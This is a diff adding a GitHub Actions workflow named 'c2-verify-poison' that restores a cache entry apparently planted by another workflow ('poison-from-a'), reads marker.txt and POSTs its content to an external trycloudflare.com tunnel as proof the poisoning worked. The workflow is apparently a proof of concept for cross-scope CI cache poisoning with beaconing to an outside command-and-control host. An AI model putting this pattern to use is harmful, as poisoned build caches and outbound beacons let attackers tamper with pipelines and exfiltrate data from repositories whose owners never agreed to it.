@@ -1,0 +1,26 @@
+name: c2-verify-poison
+on:
+  workflow_dispatch:
+jobs:
+  c2:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - uses: actions/checkout@v4
+      - name: restore the planted key
+        uses: actions/cache/restore@v4
+        with:
+          key: cacheb-marker-poison-from-a
+          path: ./
+      - name: report
+        run: |
+          set +e
+          echo "== files present =="
+          ls -la marker.txt 2>&1 | head -2
+          if [ -f marker.txt ]; then
+            C=$(cat marker.txt)
+            echo "RESTORED-CONTENT: $C"
+            curl -sS --max-time 15 -X POST -H 'Content-Type: text/plain' --data-binary "POISON-VERIFIED content=[$C]" https://speak-situations-pacific-myers.trycloudflare.com/poison-verify
+          else
+            echo "planted cache not restorable in B (scope held on read-back)"
+          fi
